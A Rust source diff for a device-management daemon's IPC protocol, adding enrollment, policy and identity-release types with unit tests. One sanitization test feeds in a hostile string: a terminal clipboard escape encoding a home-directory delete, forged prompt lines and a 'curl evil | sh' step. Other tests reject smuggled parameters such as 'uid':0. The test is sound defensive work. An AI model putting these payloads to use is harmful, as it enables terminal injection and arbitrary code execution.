+    /// it still parses.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub organization_owned: Option<bool>,
 }
 
 /// The `first_sync` object of [`EnrollStartResult`]: per-report outcome of
@@ -1790,6 +2262,130 @@ pub struct EnrollStatusResult {
     /// Metadata only — the full record is `punarctl privacy queries`.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub last_query: Option<LastQuery>,
+    /// Whether a person on this device may unenroll it — the organization's
+    /// `enrollment.removable`, fixed when the device enrolled. Present exactly
+    /// when enrolled.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub removable: Option<bool>,
+    /// Whether the organization owns this device, and so receives its serial
+    /// number and every application installed for all users — the
+    /// organization's `enrollment.ownership`, accepted by the person and
+    /// fixed when the device enrolled. Present exactly when enrolled.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub organization_owned: Option<bool>,
+    /// What the organization can see of this device (SPEC section 24.2): the
+    /// categories and field names of the inventory it last received, and
+    /// when. Present exactly when enrolled; `sent_at` is `null` and the list
+    /// empty until the first inventory is sent.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub organization_view: Option<OrganizationView>,
+    /// The organization's policy as this device enforces it, and how the last
+    /// refresh of it went (docs/api/ipc.md section 5.10). Present exactly when
+    /// enrolled.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub policy: Option<EnrollPolicyStatus>,
+    /// Whether the organization can manage this device right now: `active`,
+    /// or `interrupted` while the built-in agent cannot be used, with why and
+    /// since when (docs/api/ipc.md section 5.10). Present exactly when
+    /// enrolled.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub management: Option<ManagementStatus>,
+    /// A Smplify identity an `enroll.stop` asked the agent to wipe and the
+    /// agent has not confirmed wiped: punard keeps the device token and asks
+    /// again on every pass (docs/api/ipc.md section 5.11). Absent when there
+    /// is none.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub identity_release: Option<IdentityRelease>,
+}
+
+/// `enroll.status.management`.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct ManagementStatus {
+    /// `active` | `interrupted`.
+    pub state: String,
+    /// While interrupted: why, a closed code (`socket_missing`,
+    /// `connection_refused`, `permission_denied`, `connect_failed`,
+    /// `connection_reset`, `closed_without_answer`, `not_answering`,
+    /// `identity_missing`, `identity_mismatch`, `identity_unreadable`,
+    /// `unexpected_answer`, `token_missing`, `unexpected_listener`,
+    /// `unit_modified`, `units_unreadable`).
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub reason: Option<String>,
+    /// While interrupted: since when.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub since: Option<String>,
+}
+
+/// `enroll.status.identity_release`.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct IdentityRelease {
+    /// `pending`: punard's release record says to wipe it and the agent has
+    /// not confirmed. `kept`: punard holds a token for it and nothing records
+    /// the end of the enrollment it belonged to, so it is kept, never wiped
+    /// by punard (docs/api/ipc.md section 5.11).
+    pub state: String,
+    /// `pending`: why the last attempt did not confirm it, an agent fault
+    /// code (as in [`ManagementStatus::reason`]) or `refused` when the agent
+    /// answered with an error, absent before the first attempt. `kept`: why,
+    /// `enrollment_record_missing` or `release_record_unreadable`.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub reason: Option<String>,
+}
+
+/// `enroll.status.policy`. Every reconcile pass asks the control plane for
+/// the organization's policy; whatever it answers, the device enforces the
+/// last set that passed every check until a newer one does.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct EnrollPolicyStatus {
+    /// `sha256:…` of the enforced set, or `null` until the device has derived
+    /// it (an enrollment made by a build before the refresh).
+    #[serde(default)]
+    pub revision: Option<String>,
+    /// When the device last fetched the answer it is enforcing. A fetch that
+    /// was refused, rejected, held or failed does not move it, so it says how
+    /// fresh the enforced policy is.
+    pub fetched_at: String,
+    /// When the enforced set last changed.
+    pub changed_at: String,
+    /// The most recent refresh, or `null` before the first.
+    #[serde(default)]
+    pub last_refresh: Option<PolicyRefresh>,
+}
+
+/// `enroll.status.policy.last_refresh`.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct PolicyRefresh {
+    pub at: String,
+    /// `unchanged` | `applied` | `withdrawn` (the device enforces what the
+    /// organization serves) | `rejected` | `held` | `unreachable` |
+    /// `refused` | `failed` (it enforces the last good policy instead).
+    pub result: String,
+    /// A closed snake_case code saying why, for the last five.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub reason: Option<String>,
+}
+
+/// `enroll.status.organization_view`: read from the body that actually left
+/// the device, never from a list of what should have (docs/api/ipc.md
+/// section 5.10). Names only — the values stay on the device.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct OrganizationView {
+    /// When the inventory last reached the organization.
+    pub sent_at: Option<String>,
+    /// Sorted by category. A field sent as `null` or empty is not listed.
+    pub categories: Vec<OrganizationViewCategory>,
+}
+
+/// One category of [`OrganizationView`], e.g. `hardware` with its field
+/// names.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct OrganizationViewCategory {
+    pub category: String,
+    /// Sorted field names, exactly as sent.
+    pub fields: Vec<String>,
+    /// For each field that carried a list, how many rows it had.
+    #[serde(default, skip_serializing_if = "std::collections::BTreeMap::is_empty")]
+    pub counts: std::collections::BTreeMap<String, u64>,
 }
 
 /// The `enroll.status` view of the most recent remote query (M10).
@@ -1807,6 +2403,12 @@ pub struct LastQuery {
 pub struct EnrollStopResult {
     pub enrolled: bool,
     pub removed_policy_ids: Vec<String>,
+    /// Whether the agent confirmed it wiped the device's Smplify identity
+    /// (`released`), or has not yet (`pending`: punard keeps the device
+    /// token and asks again on every pass, docs/api/ipc.md section 5.11).
+    /// Absent from a daemon that predates it.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub identity_release: Option<String>,
 }
 
 /// `status` result (contract section 5.1).
@@ -1842,6 +2444,19 @@ pub struct StatusResult {
     /// redraws).
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub org: Option<OrgInfo>,
+}
+
+/// `device.posture` result: what the device can prove about itself, read now.
+/// `posture` and `hardware` are the managed inventory's own types, filled by
+/// the same collector, so the person and their organization read one
+/// answer. `power` is local only.
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
+pub struct DevicePostureResult {
+    pub posture: crate::device::Posture,
+    pub hardware: crate::device::Hardware,
+    pub power: crate::device::DevicePower,
+    /// RFC 3339, when this answer was read.
+    pub checked_at: String,
 }
 
 // ---------------------------------------------------------------------------
@@ -2091,6 +2706,12 @@ pub struct CapabilitiesSetResult {
 #[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
 pub struct AuditTailResult {
     pub events: Vec<AuditEvent>,
+    /// How many events inside the window belonged to other people and were
+    /// left out (F0-S3). A non-root caller reads its own events and the
+    /// device's; everyone else's are counted here and never shown. Always
+    /// `0` for root. Additive (`v: 1`): absent from an older daemon's answer.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub withheld: Option<u64>,
 }
 
 /// `reconcile` result (contract section 5.6). Every M3 field keeps its M3
@@ -2159,9 +2780,12 @@ pub struct PrivilegeStatusResult {
     pub checked_at: String,
 }
 
-/// Result of `privilege.revoke`: the grant ids that were live and are not
-/// any more. Revoking nothing is a success with an empty list — idempotent,
-/// because handing back privilege must never fail for lack of privilege.
+/// Result of `privilege.revoke`: the grant ids that were dropped. With
+/// `grant_id`, that grant; with `all`, every grant record the caller held —
+/// including one that had already lapsed but was not yet swept, because
+/// handing privilege back reads no clock (SMP-1405). Revoking nothing is a
+/// success with an empty list — idempotent, because handing back privilege
+/// must never fail for lack of privilege.
 #[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
 pub struct PrivilegeRevokeResult {
     pub revoked: Vec<String>,
@@ -2223,35 +2847,58 @@ mod tests {
 
     #[test]
     fn denial_helper_matches_the_contract_voice() {
-        let err = IpcError::denied_needs_root(
+        let err = IpcError::denied_needs_grant(
             "system.hostname",
-            Some("system.hostname"),
-            "sudo punarctl capabilities set system.hostname <name>",
+            "punarctl capabilities set system.hostname <name>",
         );
         assert_eq!(err.code, ErrorCode::Denied);
         // The 74.4 in-VM check greps for these two strings.
         assert!(err.message.contains("administrator"));
         assert!(err.message.contains("personal defaults"));
         assert!(err.message.contains("Next step"));
-        // M9: the pointer that has said "Milestone 9" since M3 now names a
-        // command that exists.
+        // The grant is the next step, for exactly this capability.
         assert!(
             err.message
-                .contains("punarctl privilege request --capability")
+                .contains("punarctl privilege request --capability system.hostname --reason")
         );
         assert!(!err.message.contains("Milestone 9"));
-        // A refusal with no capability has no grant to offer, and says so
-        // by not offering one.
-        let no_cap = IpcError::denied_needs_root(
-            "the capability registry (reconcile)",
-            None,
-            "sudo punarctl reconcile",
-        );
-        assert!(!no_cap.message.contains("privilege request"));
         let details = err.details.unwrap();
         assert_eq!(details["capability"], "system.hostname");
         assert_eq!(details["decision"], "deny");
         assert_eq!(details["policy_ids"], json!(["personal-defaults"]));
+    }
+
+    /// No person on a Punar device is root: root is locked, nobody is in
+    /// `wheel`, and Punar authors no sudoers rule (onboarding.md section 1.6).
+    /// A refusal that told them to become root would send them nowhere.
+    #[test]
+    fn no_denial_tells_a_person_to_become_root() {
+        let grant = IpcError::denied_needs_grant(
+            "security.firewall",
+            "punarctl capabilities set security.firewall enabled",
+        );
+        let root_only = IpcError::denied_root_only(
+            "Reconciling the capability registry",
+            "capability_registry",
+            "none needed — punard reconciles on its own.",
+        );
+        for err in [&grant, &root_only] {
+            // Saying that nobody holds sudo is the point; advising it is not.
+            assert!(!err.message.contains("sudo punarctl"), "{}", err.message);
+            assert!(!err.message.contains("run as root"), "{}", err.message);
+            assert!(err.message.contains("personal defaults"), "{}", err.message);
+        }
+        // A refusal that is not about a registered capability offers no grant:
+        // `privilege request` for a resource name would answer not_found.
+        assert!(!root_only.message.contains("privilege request"));
+        let details = root_only.details.unwrap();
+        assert_eq!(details["resource"], "capability_registry");
+        assert!(details.get("capability").is_none());
+        assert!(
+            root_only
+                .message
+                .ends_with("Next step: none needed — punard reconciles on its own.")
+        );
     }
 
     // -- typed request round trips ------------------------------------------
@@ -2260,6 +2907,7 @@ mod tests {
     fn every_method() -> Vec<Method> {
         let methods = vec![
             Method::Status,
+            Method::DevicePosture,
             Method::CapabilitiesList,
             Method::CapabilitiesGet(CapabilitiesGetParams {
                 capability: CapabilityId::new("security.firewall").unwrap(),
@@ -2267,6 +2915,7 @@ mod tests {
             Method::CapabilitiesSet(CapabilitiesSetParams {
                 capability: CapabilityId::new("system.hostname").unwrap(),
                 desired_state: json!("punar-m3"),
+                ticket: None,
             }),
             Method::AuditTail(AuditTailParams { n: 50 }),
             Method::Reconcile,
@@ -2282,9 +2931,13 @@ mod tests {
             }),
             Method::EnrollStart(EnrollStartParams {
                 org_domain: "acme.com".to_string(),
+                code: None,
+                ticket: None,
+                accept_non_removable: false,
+                accept_organization_owned: false,
             }),
             Method::EnrollStatus,
-            Method::EnrollStop,
+            Method::EnrollStop(EnrollStopParams::default()),
             Method::ApprovalsList,
             Method::ApprovalsGet(ApprovalIdParams {
                 approval_id: "apr_7c1d9a4e".to_string(),
@@ -2309,6 +2962,7 @@ mod tests {
             Method::ApprovalsResolve(ApprovalsResolveParams {
                 approval_id: "apr_7c1d9a4e".to_string(),
                 decision: ResolveDecision::Approved,
+                ticket: None,
             }),
             Method::ApprovalsConsume(ApprovalIdParams {
                 approval_id: "apr_7c1d9a4e".to_string(),
@@ -2333,13 +2987,18 @@ mod tests {
                 confirm_metadata_sha256:
                     "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_string(),
                 acknowledge_host_access: false,
+                ticket: Some(
+                    "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef".to_string(),
+                ),
             }),
             Method::AppsRemove(AppsRemoveParams {
                 id: "spotify".to_string(),
+                ticket: None,
             }),
             Method::AppsUpdate(AppsUpdateParams {
                 id: None,
                 all: true,
+                ticket: None,
             }),
             Method::WebAppsList(WebAppsListParams::default()),
             Method::WebAppsGet(WebAppsGetParams {
@@ -2370,14 +3029,24 @@ mod tests {
                 id: "atlas".to_string(),
                 purge_data: true,
             }),
+            Method::PimMailOpen,
+            Method::PimMailAccountAdd,
+            Method::PimMailAccountManage,
             Method::UpdateStatus,
-            Method::UpdateCheck(UpdateCheckParams { force: false }),
+            Method::UpdateCheck(UpdateCheckParams {
+                force: false,
+                ticket: None,
+            }),
             Method::UpdateApply(UpdateApplyParams {
                 version: "2026.08.31.1".parse().unwrap(),
                 allow_downgrade: false,
+                ticket: None,
             }),
             Method::UpdateReconcileCandidate,
-            Method::UpdateRollback(UpdateRollbackParams { to_version: None }),
+            Method::UpdateRollback(UpdateRollbackParams {
+                to_version: None,
+                ticket: None,
+            }),
             Method::InstallTargets,
             Method::InstallPlan(InstallPlanParams {
                 disk: "/dev/vda".to_string(),
@@ -2406,6 +3075,12 @@ mod tests {
                 groups_fd: 5,
             }),
             Method::InstallStatus,
+            Method::AdminsList,
+            Method::AdminsSet(AdminsSetParams {
+                user: "alice".to_string(),
+                administrator: true,
+                ticket: None,
+            }),
         ];
         assert_eq!(
             methods.len(),
@@ -2428,6 +3103,32 @@ mod tests {
         }
     }
 
+    /// `capabilities.set` carries an administrator's ticket when one is
+    /// given (the device's keyboard layout, contract section 5.4), and an
+    /// older client's request without one still parses.
+    #[test]
+    fn capabilities_set_carries_an_optional_ticket() {
+        let ticket = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
+        let method = Method::CapabilitiesSet(CapabilitiesSetParams {
+            capability: CapabilityId::new("system.keymap").unwrap(),
+            desired_state: json!("de"),
+            ticket: Some(ticket.to_string()),
+        });
+        let line = Request::new("req-1", method.clone())
+            .unwrap()
+            .to_json_line();
+        assert!(line.contains(ticket));
+        assert_eq!(
+            Request::parse_json_line(line.trim_end()).unwrap().method,
+            method
+        );
+        let older = r#"{"v":1,"id":"req-2","method":"capabilities.set","params":{"capability":"system.keymap","desired_state":"de"}}"#;
+        match Request::parse_json_line(older).unwrap().method {
+            Method::CapabilitiesSet(params) => assert_eq!(params.ticket, None),
+            other => panic!("parsed as {}", other.name()),
+        }
+    }
+
     #[test]
     fn method_names_match_the_contract_table() {
         for (method, name) in every_method().iter().zip(Method::NAMES) {
@@ -2445,18 +3146,13 @@ mod tests {
                 method.name(),
                 "capabilities.set"
                     | "reconcile"
-                    | "enroll.start"
-                    | "enroll.stop"
                     // M9: minting and spending approvals are privileged.
                     // `approvals.resolve` is human-only, which is a
                     // stronger rule this flag cannot express (see
                     // `Method::requires_root`).
                     | "approvals.create"
                     | "approvals.consume"
-                    | "update.check"
-                    | "update.apply"
                     | "update.reconcile_candidate"
-                    | "update.rollback"
                     | "install.plan"
                     | "install.apply"
                     | "install.recovery_ack"
@@ -2476,6 +3172,73 @@ mod tests {
                     "method {name:?} looks like generic execution"
                 );
             }
+        }
+    }
+
+    /// The IPC amendment for the first-party apps (docs/api/ipc.md section
+    /// 24) holds these names before their handlers exist. Pinned here, so a
+    /// change that adds, drops or reorders a reserved name has to say so in
+    /// this test, next to the contract text it must also change.
+    #[test]
+    fn the_reserved_names_are_exactly_the_amendments_list() {
+        assert_eq!(
+            Method::RESERVED,
+            [
+                "resources.sample",
+                "process.signal",
+                "sysfiles.list",
+                "sysfiles.apply",
+                "sysfiles.revert",
+                "storage.share_mount",
+                "storage.share_unmount",
+                "storage.share_list",
+                "storage.share_forget",
+            ]
+        );
+        // F0 adds exactly the two role methods; every app method is still
+        // only a reservation.
+        assert_eq!(Method::NAMES.len(), 47);
+        assert_eq!(&Method::NAMES[45..], ["admins.list", "admins.set"]);
+    }
+
+    /// A reserved name has no handler yet, so it must answer exactly what an
+    /// unknown name answers — not `invalid_params`, and never a dispatch.
+    #[test]
+    fn a_reserved_name_answers_unknown_method_until_its_handler_lands() {
+        for name in Method::RESERVED {
+            assert!(
+                !Method::NAMES.contains(&name),
+                "{name} is reserved and live at once"
+            );
+            let line = format!(r#"{{"v":1,"id":"r","method":"{name}","params":{{}}}}"#);
+            let reject = Request::parse_json_line(&line).unwrap_err();
+            assert_eq!(reject.error.code, ErrorCode::UnknownMethod, "{name}");
+            for forbidden in ["exec", "shell", "script", "eval", "spawn", "command"] {
+                assert!(!name.contains(forbidden), "{name} looks like execution");
+            }
+        }
+    }
+
+    #[test]
+    fn admins_set_names_one_account_and_nothing_else() {
+        let line = r#"{"v":1,"id":"a","method":"admins.set","params":{"user":"bob","administrator":false}}"#;
+        let request = Request::parse_json_line(line).unwrap();
+        assert_eq!(
+            request.method,
+            Method::AdminsSet(AdminsSetParams {
+                user: "bob".into(),
+                administrator: false,
+                ticket: None
+            })
+        );
+        for smuggled in [
+            r#"{"v":1,"id":"a","method":"admins.set","params":{"user":"bob","administrator":true,"uid":0}}"#,
+            r#"{"v":1,"id":"a","method":"admins.set","params":{"user":"bob"}}"#,
+            r#"{"v":1,"id":"a","method":"admins.set"}"#,
+            r#"{"v":1,"id":"a","method":"admins.list","params":{"user":"bob"}}"#,
+        ] {
+            let reject = Request::parse_json_line(smuggled).unwrap_err();
+            assert_eq!(reject.error.code, ErrorCode::InvalidParams, "{smuggled}");
         }
     }
 
@@ -2587,6 +3350,9 @@ mod tests {
             "capabilities.list",
             "reconcile",
             "apps.list",
+            "pim.mail.open",
+            "pim.mail.account_add",
+            "pim.mail.account_manage",
             "update.status",
             "install.targets",
             "install.status",
@@ -2633,7 +3399,8 @@ mod tests {
             request.method,
             Method::AppsUpdate(AppsUpdateParams {
                 id: None,
-                all: true
+                all: true,
+                ticket: None,
             })
         ));
         let reject = Request::parse_json_line(
@@ -2680,7 +3447,10 @@ mod tests {
         .unwrap();
         assert!(matches!(
             request.method,
-            Method::UpdateCheck(UpdateCheckParams { force: true })
+            Method::UpdateCheck(UpdateCheckParams {
+                force: true,
+                ticket: None
+            })
         ));
         for forbidden in ["origin", "url", "path", "key"] {
             let line = format!(
@@ -2689,6 +3459,21 @@ mod tests {
             let reject = Request::parse_json_line(&line).unwrap_err();
             assert_eq!(reject.error.code, ErrorCode::InvalidParams, "{forbidden}");
         }
+        // A person's confirmation is the one other thing it may carry, and it
+        // is never echoed back into the request a client sends without one.
+        let ticket = "0123456789abcdef".repeat(4);
+        let with = Request::parse_json_line(&format!(
+            r#"{{"v":1,"id":"1","method":"update.check","params":{{"force":false,"ticket":"{ticket}"}}}}"#
+        ))
+        .unwrap();
+        assert_eq!(
+            with.method.params_value(),
+            Some(json!({ "force": false, "ticket": ticket }))
+        );
+        assert_eq!(
+            request.method.params_value(),
+            Some(json!({ "force": true }))
+        );
     }
 
     #[test]
@@ -2711,7 +3496,10 @@ mod tests {
         .unwrap();
         assert!(matches!(
             rollback.method,
-            Method::UpdateRollback(UpdateRollbackParams { to_version: None })
+            Method::UpdateRollback(UpdateRollbackParams {
+                to_version: None,
+                ticket: None
+            })
         ));
 
         let commit =
@@ -2956,7 +3744,7 @@ mod tests {
     #[test]
     fn contract_error_example_parses() {
         // The docs/api/ipc.md section 3.2 error example, verbatim.
-        let line = r#"{"v": 1, "id": "req-1", "error": {"code": "denied", "message": "Changing system.hostname needs administrator privileges.\nPolicy: personal defaults — just-in-time elevation arrives in Milestone 9.\nNext step: re-run as root: sudo punarctl capabilities set system.hostname <name>", "details": {"capability": "system.hostname", "decision": "deny", "policy_ids": ["personal-defaults"]}}}"#;
+        let line = r#"{"v": 1, "id": "req-1", "error": {"code": "denied", "message": "Changing system.hostname needs administrator privileges.\nPolicy: personal defaults — an ordinary user may hold privilege for a bounded window, never permanently (SPEC section 48).\nNext step: ask for time-boxed privilege: punarctl privilege request --capability system.hostname --reason \"<why>\"; once you approve it, run punarctl capabilities set system.hostname <name> again.", "details": {"capability": "system.hostname", "decision": "deny", "policy_ids": ["personal-defaults"]}}}"#;
         let response = Response::parse_json_line(line).unwrap();
         match response.body {
             ResponseBody::Error(error) => {
@@ -3158,7 +3946,140 @@ mod tests {
     }
 
     #[test]
-    fn enroll_status_and_stop_take_no_params() {
+    fn accepting_a_non_removable_enrollment_is_explicit_and_absent_by_default() {
+        let plain: EnrollStartParams =
+            serde_json::from_value(json!({"org_domain": "acme.com"})).unwrap();
+        assert!(!plain.accept_non_removable);
+        assert_eq!(
+            serde_json::to_value(&plain).unwrap(),
+            json!({"org_domain": "acme.com"}),
+            "a request that accepts nothing says nothing"
+        );
+        let accepting: EnrollStartParams =
+            serde_json::from_value(json!({"org_domain": "acme.com", "accept_non_removable": true}))
+                .unwrap();
+        assert!(accepting.accept_non_removable);
+        assert!(!accepting.accept_organization_owned);
+    }
+
+    /// Each term a refusal can name maps to exactly one parameter that
+    /// accepts it and one punarctl flag, so a client that sends back what it
+    /// was asked for accepts that term and nothing else.
+    #[test]
+    fn every_enrollment_term_is_accepted_by_its_own_parameter_and_flag() {
+        for term in EnrollmentTerm::ALL {
+            assert_eq!(EnrollmentTerm::from_wire(term.as_str()), Some(term));
+            let params: EnrollStartParams = serde_json::from_value(json!({
+                "org_domain": "acme.com",
+                term.param(): true,
+            }))
+            .unwrap();
+            for other in EnrollmentTerm::ALL {
+                assert_eq!(params.accepts(other), other == term, "{term:?}");
+            }
+            assert_eq!(
+                serde_json::to_value(&params).unwrap(),
+                json!({"org_domain": "acme.com", term.param(): true})
+            );
+            assert_eq!(
+                term.flag(),
+                format!("--{}", term.param().replace('_', "-")),
+                "punarctl's flag is the parameter's name"
+            );
+            assert_ne!(term.refusal_reason(), ENROLLMENT_TERMS_NOT_ACCEPTED);
+        }
+        assert_eq!(EnrollmentTerm::from_wire("removable"), None);
+        // The name shown beside a term cannot hide or reorder it.
+        assert_eq!(
+            term_safe_name("Acme\u{1b}[8m Engineering\u{202e}\u{2066}\n"),
+            "Acme\u{fffd}[8m Engineering\u{fffd}\u{fffd}\u{fffd}"
+        );
+        assert_eq!(
+            term_safe_name("Acme\u{2028}Personal\u{200b}\u{feff}"),
+            "Acme\u{fffd}Personal\u{fffd}\u{fffd}"
+        );
+        assert_eq!(term_safe_name("Acmé Engineering"), "Acmé Engineering");
+        // The ownership term says what it adds, in the words the owner chose,
+        // and no organization's name is part of them.
+        let owned = EnrollmentTerm::OrganizationOwned.meaning();
+        assert!(owned.contains("serial number"), "{owned}");
+        assert!(owned.contains("the organization also receives"), "{owned}");
+        assert!(
+            owned.contains("every app installed for all users"),
+            "{owned}"
+        );
+    }
+
+    /// The name an organization chooses is cleaned once, where punard reads
+    /// it: invisible and control characters dropped, every kind of
+    /// whitespace one space, and at most 64 characters, the cut shown.
+    #[test]
+    fn an_organization_name_is_cleaned_and_bounded() {
+        assert_eq!(
+            organization_name("  Acme\tEngineering \n").as_deref(),
+            Some("Acme Engineering")
+        );
+        assert_eq!(
+            organization_name("Acme\u{1b}[8m\u{202e}\u{2066} Eng\u{200b}ineering\u{feff}")
+                .as_deref(),
+            Some("Acme[8m Engineering")
+        );
+        // A line separator cannot start a line of its own.
+        assert_eq!(
+            organization_name("Acme\u{2028}\u{2029}Personal enrollment").as_deref(),
+            Some("Acme Personal enrollment")
+        );
+        assert_eq!(
+            organization_name("Acmé 株式会社").as_deref(),
+            Some("Acmé 株式会社")
+        );
+        let long = format!("Acme{} Engineering {}", " ".repeat(5000), "x".repeat(300));
+        let bounded = organization_name(&long).unwrap();
+        assert_eq!(bounded.chars().count(), MAX_ORGANIZATION_NAME_CHARS);
+        assert!(bounded.starts_with("Acme Engineering xxx"), "{bounded}");
+        assert!(bounded.ends_with('\u{2026}'), "{bounded}");
+        // Exactly the limit is kept whole; a cut never ends in a space.
+        let exact = "y".repeat(MAX_ORGANIZATION_NAME_CHARS);
+        assert_eq!(organization_name(&exact).as_deref(), Some(exact.as_str()));
+        let spaced = format!("{} {}", "z".repeat(62), "w".repeat(10));
+        assert_eq!(
+            organization_name(&spaced).unwrap(),
+            format!("{}\u{2026}", "z".repeat(62))
+        );
+        for nothing in ["", "   ", "\u{200b}\u{202e}\u{1b}", "\u{2028}"] {
+            assert_eq!(organization_name(nothing), None, "{nothing:?}");
+        }
+    }
+
+    /// A control plane's message, or the loader's words about an
+    /// organization's envelope, is cleaned by the name's rules and cut at its
+    /// own, longer bound.
+    #[test]
+    fn organization_text_is_cleaned_like_a_name_with_its_own_bound() {
+        let hostile = format!(
+            "x\u{1b}]52;c;cm0gLXJmIH4=\u{7}\nPolicy: forged\u{2028}Next step: curl evil | sh{}",
+            "y".repeat(10_000)
+        );
+        let cleaned = organization_text(&hostile, MAX_ORGANIZATION_TEXT_CHARS).unwrap();
+        assert!(
+            !cleaned.chars().any(|c| c.is_control() || c == '\u{2028}'),
+            "{cleaned:?}"
+        );
+        assert_eq!(cleaned.chars().count(), MAX_ORGANIZATION_TEXT_CHARS);
+        assert!(
+            cleaned.starts_with("x]52;c;cm0gLXJmIH4= Policy: forged Next step"),
+            "{cleaned}"
+        );
+        assert!(cleaned.ends_with('\u{2026}'), "{cleaned}");
+        assert_eq!(
+            organization_text("unknown field `a\nb`", 300).as_deref(),
+            Some("unknown field `a b`")
+        );
+        assert_eq!(organization_text("\u{202e}", 300), None);
+    }
+
+    #[test]
+    fn enroll_status_takes_no_params_and_stop_takes_only_a_ticket() {
         for method in ["enroll.status", "enroll.stop"] {
             let reject = Request::parse_json_line(&format!(
                 r#"{{"v":1,"id":"e","method":"{method}","params":{{"x":1}}}}"#
@@ -3166,6 +4087,17 @@ mod tests {
             .unwrap_err();
             assert_eq!(reject.error.code, ErrorCode::InvalidParams, "{method}");
         }
+        // Root sends nothing; a person sends the ticket.
+        assert_eq!(
+            Method::from_wire("enroll.stop", None).unwrap(),
+            Method::EnrollStop(EnrollStopParams::default())
+        );
+        assert_eq!(
+            Method::from_wire("enroll.stop", Some(json!({"ticket": "t"}))).unwrap(),
+            Method::EnrollStop(EnrollStopParams {
+                ticket: Some("t".to_string())
+            })
+        );
     }
 
     #[test]
@@ -3201,6 +4133,12 @@ mod tests {
             last_sync: None,
             remote_query_scopes: None,
             last_query: None,
+            removable: None,
+            organization_owned: None,
+            organization_view: None,
+            policy: None,
+            management: None,
+            identity_release: None,
         };
         assert_eq!(
             serde_json::to_string(&result).unwrap(),
@@ -3227,6 +4165,85 @@ mod tests {
         assert_eq!(sync.result.as_deref(), Some("success"));
         assert!(!sync.pending);
         assert_eq!(result.attestation.as_deref(), Some("simulated"));
+    }
+
+    /// Section 5.10's policy block: an unknown revision and a refresh not yet
+    /// run are `null`, never absent, and a result that needs no reason
+    /// carries none.
+    #[test]
+    fn the_policy_block_round_trips_with_its_nulls() {
+        let result: EnrollStatusResult = serde_json::from_value(json!({
+            "enrolled": true,
+            "policy": {
+                "revision": "sha256:ab",
+                "fetched_at": "2026-09-24T10:00:00Z",
+                "changed_at": "2026-09-24T09:00:00Z",
+                "last_refresh": {"at": "2026-09-24T10:02:00Z", "result": "rejected",
+                                  "reason": "duplicate_policy_id"}
+            }
+        }))
+        .unwrap();
+        let policy = result.policy.as_ref().unwrap();
+        assert_eq!(policy.revision.as_deref(), Some("sha256:ab"));
+        let refresh = policy.last_refresh.as_ref().unwrap();
+        assert_eq!(refresh.reason.as_deref(), Some("duplicate_policy_id"));
+
+        let fresh = EnrollPolicyStatus {
+            revision: None,
+            fetched_at: "2026-09-24T09:00:00Z".into(),
+            changed_at: "2026-09-24T09:00:00Z".into(),
+            last_refresh: None,
+        };
+        assert_eq!(
+            serde_json::to_value(&fresh).unwrap(),
+            json!({"revision": null, "fetched_at": "2026-09-24T09:00:00Z",
+                   "changed_at": "2026-09-24T09:00:00Z", "last_refresh": null})
+        );
+        let unchanged = PolicyRefresh {
+            at: "2026-09-24T10:02:00Z".into(),
+            result: "unchanged".into(),
+            reason: None,
+        };
+        assert_eq!(
+            serde_json::to_value(&unchanged).unwrap(),
+            json!({"at": "2026-09-24T10:02:00Z", "result": "unchanged"})
+        );
+        let older: EnrollStatusResult = serde_json::from_value(json!({"enrolled": true})).unwrap();
+        assert_eq!(older.policy, None, "a daemon that predates the block");
+    }
+
+    /// Section 5.10's organization view: names and counts, never values;
+    /// `counts` absent when no field carried a list, and a view with nothing
+    /// sent yet says so with a `null` time rather than disappearing.
+    #[test]
+    fn the_organization_view_round_trips_names_and_counts_only() {
+        let result: EnrollStatusResult = serde_json::from_value(json!({
+            "enrolled": true,
+            "organization_view": {
+                "sent_at": "2026-09-24T10:00:00Z",
+                "categories": [
+                    {"category": "os", "fields": ["arch", "name"]},
+                    {"category": "software", "fields": ["installedPackages"],
+                     "counts": {"installedPackages": 4}}
+                ]
+            }
+        }))
+        .unwrap();
+        let view = result.organization_view.as_ref().unwrap();
+        assert_eq!(view.categories[1].counts["installedPackages"], 4);
+        let back = serde_json::to_value(view).unwrap();
+        assert_eq!(
+            back["categories"][0],
+            json!({"category": "os", "fields": ["arch", "name"]})
+        );
+        let nothing_yet = OrganizationView {
+            sent_at: None,
+            categories: vec![],
+        };
+        assert_eq!(
+            serde_json::to_value(&nothing_yet).unwrap(),
+            json!({"sent_at": null, "categories": []})
+        );
     }
 
     #[test]
@@ -3295,9 +4312,51 @@ mod tests {
 
     #[test]
     fn enroll_timeout_bounds_cover_each_other() {
-        // Contract section 2: the 90 s client budget must cover the 60 s
-        // processing bound with margin.
+        // Contract section 2: the 90 s client budget must cover the 70 s
+        // processing bound with margin, and punarctl's wait for a reconcile
+        // the pass's.
         assert!(ENROLL_START_CLIENT_TIMEOUT > ENROLL_START_PROCESS_TIMEOUT);
